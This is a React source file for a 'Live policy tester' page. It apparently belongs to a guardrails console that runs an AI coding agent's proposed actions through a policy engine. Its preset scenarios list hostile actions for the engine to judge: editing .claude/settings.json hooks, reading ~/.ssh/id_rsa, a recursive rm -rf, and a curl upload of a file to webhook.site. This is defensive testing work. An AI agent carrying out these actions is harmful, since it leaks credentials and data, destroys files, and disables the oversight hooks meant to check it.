import { useState } from "react";
import { api, type ActionClass, type DecisionReceipt } from "@grdr/api";
import { Quoted, VerdictBadge } from "@grdr/kit";
import { Banner, Button, Card, GrdrIcon, Heading, HStack, Text, TextInput, VStack } from "@grdr/ui";

const PRESETS: Array<{ label: string; actionClass: ActionClass; target: string; summary: string }> = [
  {
    label: "Edit Claude settings (Block)",
    actionClass: "file.write",
    target: ".claude/settings.json",
    summary: "Attempt modifying hook settings",
  },
  {
    label: "Read SSH key (Ask)",
    actionClass: "file.read",
    target: "~/.ssh/id_rsa",
    summary: "Attempt reading private SSH key",
  },
  {
    label: "Destructive rm -rf (Ask)",
    actionClass: "exec",
    target: "rm -rf /tmp/staging",
    summary: "Recursive deletion shell command",
  },
  {
    label: "Outbound curl upload (Watch)",
    actionClass: "exec",
    target: "curl -d @notes.txt https://webhook.site/test",
    summary: "Outbound transfer probe",
  },
  {
    label: "Safe git status (Allow)",
    actionClass: "exec",
    target: "git status --short",
    summary: "Read-only repository check",
  },
];

export function TesterPage({ onEvaluated }: { onEvaluated: () => void }) {
  const [agentName, setAgentName] = useState("claude-code");
  const [sessionId, setSessionId] = useState("sess-live-eval");
  const [actionClass, setActionClass] = useState<ActionClass>("file.write");
  const [target, setTarget] = useState(".claude/settings.json");
  const [receipt, setReceipt] = useState<DecisionReceipt | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  async function evaluateNow(override?: { actionClass: ActionClass; target: string; summary: string }) {
    setError(null);
    setSubmitting(true);
    try {
      const res = await api.decideAction({
        session_id: sessionId,
        device_id: "dev-demo-01",
        device_name: "console-tester",
        agent_name: agentName,
        action_class: override?.actionClass ?? actionClass,
        target: override?.target ?? target,
        summary: override?.summary ?? "Live policy simulator evaluation",
      });
      setReceipt(res);
      onEvaluated();
    } catch (err) {
      setError((err as Error).message);
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <VStack gap={4}>
      <div className="page-header">
        <div>
          <Heading level={1}>Live policy tester</Heading>
          <Text color="secondary">
            Evaluate real actions through the Guardrails policy engine, mint cryptographic receipts, and trigger live SSE session and approval events.
          </Text>
        </div>
      </div>

      {error && <Banner status="error" title={error} collapsible={false} />}

      <Card padding={3}>
        <VStack gap={3}>
          <HStack gap={2} align="center">
            <GrdrIcon name="terminal" size={16} />
            <Heading level={2}>Quick scenarios</Heading>
          </HStack>
          <HStack gap={2}>
            {PRESETS.map((preset) => (
              <Button
                key={preset.label}
                size="sm"
                label={preset.label}
                icon={<GrdrIcon name="play" size={12} />}
                isDisabled={submitting}
                onClick={() => {
                  setActionClass(preset.actionClass);
                  setTarget(preset.target);
                  void evaluateNow(preset);
                }}
              />
            ))}
          </HStack>

          <form
            className="form-grid"
            onSubmit={(e) => {
              e.preventDefault();
              void evaluateNow();
            }}
          >
            <TextInput label="Agent" value={agentName} onChange={(v) => setAgentName(v)} isRequired />
            <TextInput
              label="Session ID"
              value={sessionId}
              onChange={(v) => setSessionId(v)}
              isRequired
            />
            <div className="field">
              <label htmlFor="test-class">Action class</label>
              <select
                id="test-class"
                value={actionClass}
                onChange={(e) => setActionClass(e.target.value as ActionClass)}
              >
                <option value="exec">exec</option>
                <option value="file.read">file.read</option>
                <option value="file.write">file.write</option>
                <option value="file.delete">file.delete</option>
                <option value="net.request">net.request</option>
                <option value="mcp.call">mcp.call</option>
                <option value="elevate">elevate</option>
              </select>
            </div>
            <TextInput
              label="Target path or command"
              value={target}
              onChange={(v) => setTarget(v)}
              isRequired
            />
            <div className="field full" style={{ flexDirection: "row", justifyContent: "flex-end" }}>
              <Button
                type="submit"
                variant="primary"
                label={submitting ? "Evaluating..." : "Evaluate action"}
                isDisabled={submitting}
              />
            </div>
          </form>
        </VStack>
      </Card>

      {receipt && (
        <Card padding={3}>
          <VStack gap={2}>
            <HStack justify="between" align="center">
              <Heading level={2}>Decision receipt</Heading>
              <VerdictBadge verdict={receipt.verdict} />
            </HStack>
            <div>
              <strong>Target: </strong>
              <Quoted text={receipt.target} />
            </div>
            <div>
              <strong>Rule: </strong>
              <span className="mono">{receipt.rule_id ?? "none"}</span>
            </div>
            <div>
              <strong>Reason: </strong>
              <span>{receipt.reason}</span>
            </div>
            <div>
              <strong>Next step: </strong>
              <span>{receipt.next_step}</span>
            </div>
            <div className="mono" style={{ color: "var(--ink-muted)" }}>
              SHA-256: {receipt.receipt_digest}
            </div>
          </VStack>
        </Card>
      )}
    </VStack>
  );
}
